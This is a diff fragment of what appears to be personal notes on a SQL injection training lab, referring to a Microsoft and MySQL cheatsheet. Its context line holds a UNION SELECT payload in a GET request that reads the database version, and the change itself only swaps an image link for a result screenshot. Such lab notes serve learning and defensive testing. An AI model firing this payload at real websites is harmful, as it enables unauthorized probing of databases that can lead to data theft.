@@ -15,4 +15,5 @@ Microsoft and MySQL cheatsheet:
 try:
 GET /filter?category=Lifestyle'+UNION+SELECT+@@version,NULL# HTTP/2
 
-![alt text](image.png)
+-> Result:
+![alt text](lab13.png)
